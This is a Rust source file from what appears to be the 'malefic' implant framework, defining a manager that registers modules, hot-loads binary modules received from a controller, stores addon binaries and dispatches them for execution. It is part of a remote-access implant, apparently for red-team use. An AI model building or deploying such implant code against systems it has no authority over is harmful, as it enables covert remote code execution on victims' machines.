
#![allow(improper_ctypes_definitions)]
use std::collections::HashMap;
use malefic_helper::debug;
use malefic_proto::new_spite;
use malefic_proto::proto::implantpb::Spite;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::Addon;
use malefic_modules::{check_field, MaleficBundle, MaleficModule};

use crate::check_body;
use crate::common::error::MaleficError;
use crate::manager::addons::{AddonMap, MaleficAddon};

type ModuleRegister = extern "C" fn () -> MaleficBundle;



pub struct MaleficManager {
    bundles: HashMap<String, ModuleRegister>,
    pub(crate) modules: Box<MaleficBundle>,
    addons: AddonMap
}

impl MaleficManager{
    pub fn new() -> Self {
        MaleficManager {
            bundles: HashMap::new(),
            modules: Box::new(HashMap::new()),
            addons: AddonMap::new(),
        }
    }

    pub fn clean(&mut self) -> Result<(), MaleficError> {
        let _ = self.refresh_addon()?;
        let _ = self.refresh_module()?;
        Ok(())
    }

    pub fn refresh_module(&mut self) -> Result<(), MaleficError> {
        self.bundles.clear();
        self.bundles.insert("origin".to_string(), malefic_modules::register_modules as ModuleRegister);
        #[cfg(feature = "malefic-3rd")]
        self.bundles.insert("3rd".to_string(), malefic_3rd::register_3rd as ModuleRegister);
        self.reload()
    }

    pub fn refresh_addon(&mut self) -> Result<(), MaleficError> {
        self.addons.clear();
        Ok(())
    }

    pub fn reload(&mut self) -> Result<(), MaleficError> {
        self.modules.clear();
        for (name, bundle) in self.bundles.iter() {
            let bundle_modules = bundle();
            debug!("refresh module: {} {:?}", name, bundle_modules.keys());
            for (module_name, module) in bundle_modules {
                self.modules.insert(module_name.to_string(), module);
            }
        }
        Ok(())
    }

    pub fn load_module(&mut self, spite: Spite) -> Result<Vec<String>, MaleficError> {
        let mut modules = Vec::new();
        #[cfg(feature = "hot_load")]
        {
            let module = check_body!(spite, Body::LoadModule)?;
            let bin = check_field!(module.bin)?;
            let bundle_name = check_field!(module.bundle)?;
            unsafe {
                let bundle = malefic_helper::common::hot_modules::load_module(bin, bundle_name.clone())
                    .map_err(|_| MaleficError::ModuleError)?;

                let ret = malefic_helper::common::hot_modules::call_fresh_modules(bundle as _)
                    .ok_or_else(|| MaleficError::ModuleError)?;

                let register_func: ModuleRegister = core::mem::transmute(ret);
                self.bundles.insert(bundle_name.to_string(), register_func);
                
                let bundle_modules = register_func();
                debug!("load modules: {} {:?}", bundle_name.to_string(), bundle_modules.keys());
                for (module_name, module) in bundle_modules {
                    modules.push(module_name.to_string());
                    self.modules.insert(module_name.to_string(), module);
                }
                
                debug!("[+] modules insert succ!");
            }
        }
        Ok(modules)
    }

    pub fn list_module(&self, internal: Vec<String>) -> Vec<String> {
        let mut modules: Vec<String> = self.modules.keys().cloned().collect();
        modules.extend(internal);
        modules
    }

    pub fn get_module(&self, name: &String) -> Option<&Box::<MaleficModule>> {
        self.modules.get(name)
    }

    pub fn get_addon(&mut self, name: &String) -> anyhow::Result<Box<MaleficAddon>> {
        self.addons.get(name)
    }

    pub fn list_addon(&self) -> Vec<Addon> {
        let mut addons = Vec::new();
        for (name, module) in self.addons.iter() {
            addons.push(Addon{
                name: name.clone(),
                r#type: module.r#type.clone(),
                depend: module.depend.clone(),
            })
        }
        addons
    }

    pub fn load_addon(&mut self, spite: Spite) -> Result<(), MaleficError> {
        let ext = check_body!(spite, Body::LoadAddon)?;

        let addon = MaleficAddon {
            name: check_field!(ext.name)?,
            r#type: ext.r#type,
            depend: check_field!(ext.depend)?,
            content: check_field!(ext.bin)?,
        };
        self.addons.insert(addon)?;
        Ok(())
    }

    pub fn execute_addon(&mut self, spite: Spite) -> Result<Spite, MaleficError> {
        let ext = check_body!(spite, Body::ExecuteAddon)?;

        let addon = self.get_addon(&check_field!(ext.addon)?)?;
        if self.get_module(&addon.depend).is_none() {
            return Err(MaleficError::ModuleNotFound);
        }

        let mut execute_binary = ext.execute_binary.clone().unwrap();
        execute_binary.bin = addon.content.clone();
        execute_binary.name = addon.name.clone();
        let result = new_spite(spite.task_id, addon.depend.clone(), Body::ExecuteBinary(execute_binary));

        Ok(result)
    }
}